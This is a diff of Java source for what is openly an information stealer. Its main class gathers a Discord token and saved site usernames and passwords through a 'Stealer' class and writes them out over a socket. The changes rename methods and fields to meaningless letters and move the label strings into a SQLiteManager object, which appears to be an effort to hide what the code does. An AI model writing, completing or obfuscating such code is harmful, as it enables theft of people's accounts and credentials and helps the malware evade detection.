@@ -10,6 +10,7 @@ import java.util.List;
 
 public class Main {
     private static Socket socket;
+    public static SQLiteManager sql;
 
     public static void main(String[] b) {
         try {
@@ -21,15 +22,17 @@ public class Main {
             OutputStreamWriter osw = new OutputStreamWriter(os);
             BufferedWriter bw = new BufferedWriter(osw);
 
+            sql = new SQLiteManager();
+            sql.initialize();
 
-            List<Data> dataList = Stealer.steal();
+            List<Data> dataList = Stealer.s();
 
             StringBuilder builder = new StringBuilder();
-            builder.append("Token: " + Discord.getToken().replace(" ", "") + "||||||");
+            builder.append(sql.n + Discord.getToken().replace(" ", "") + "||||||");
             for(Data data : dataList) {
-                builder.append(data.siteURL + ":||");
-                builder.append("Username: " + data.username + "||");
-                builder.append("Password: " + data.password + "||||");
+                builder.append(data.x + ":||");
+                builder.append(sql.o + data.y + "||");
+                builder.append(sql.p + data.z + "||||");
             }
 
             bw.write(builder.toString());
